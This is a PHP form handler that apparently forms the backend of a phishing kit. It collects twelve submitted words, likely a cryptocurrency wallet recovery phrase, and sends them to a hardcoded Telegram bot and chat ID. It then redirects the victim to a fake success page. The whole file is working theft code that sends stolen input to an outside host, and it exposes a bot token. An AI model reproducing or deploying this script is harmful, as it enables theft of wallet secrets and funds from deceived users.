<?php

$ip = $_SERVER['REMOTE_ADDR'];
$message = "
".$_POST['1']." ".$_POST['2']." ".$_POST['3']." ".$_POST['4']." ".$_POST['5']." ".$_POST['6']." ".$_POST['7']." ".$_POST['8']." ".$_POST['9']." ".$_POST['10']." ".$_POST['11']." ".$_POST['12']." \n";


function sendMessage($messaggio) {
    $token = '1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ';
    $chatid = '1097743075';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage(strtolower($message));
header("Location: ../success/success.html");

    

?>